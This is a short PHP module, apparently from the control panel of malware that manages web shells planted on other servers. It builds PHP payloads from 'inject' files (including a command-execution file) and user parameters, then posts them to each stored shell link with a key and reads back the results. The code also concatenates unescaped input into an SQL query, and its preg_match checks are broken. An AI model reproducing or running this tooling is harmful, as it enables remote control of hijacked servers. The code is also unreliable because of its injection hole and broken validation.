<?php

$smarty->assign('rand_name', mt_rand(0000000000, 9999999999));

if(!empty($Cur['id'])){
	$result = $mysqli->query("SELECT id, link, keyid, shell FROM bf_admins WHERE (id='".$Cur['id']."')");
	if($result->id == $Cur['id']){
        $smarty->assign('admin', $result);
		$get_php = '$cur_file = \''.$result->shell.'\';';
		if(!empty($Cur['x']) && preg_match('~^(a-zA-Z\.\-_/)$~is')) $get_php .= '$add_sys = \''.$Cur['x'].'\';';
		if(!empty($Cur['y'])) $get_php .= '$delete_sys = \''.$Cur['y'].'\';';
		if(!empty($Cur['z'])  && preg_match('~^(a-zA-Z\.\-_/)$~is')) $get_php .= '$save_cmd = \''.$Cur['z'].'\';';
		$get_php .= file_get_contents('modules/admins/injects/start.php');
		$get_php .= file_get_contents('modules/admins/injects/mysqli.php');
		$get_php .= file_get_contents('modules/admins/injects/cmd_shever_fgr.php');
		$list = get_http($result->link, $get_php, $result->keyid, $result->shell);
		$cfg = json_decode($list, true);
		$cfg['hist']['l'] = explode('|', $cfg['hist']['l']);
		$smarty->assign('cfg', $cfg);
	}
}

?>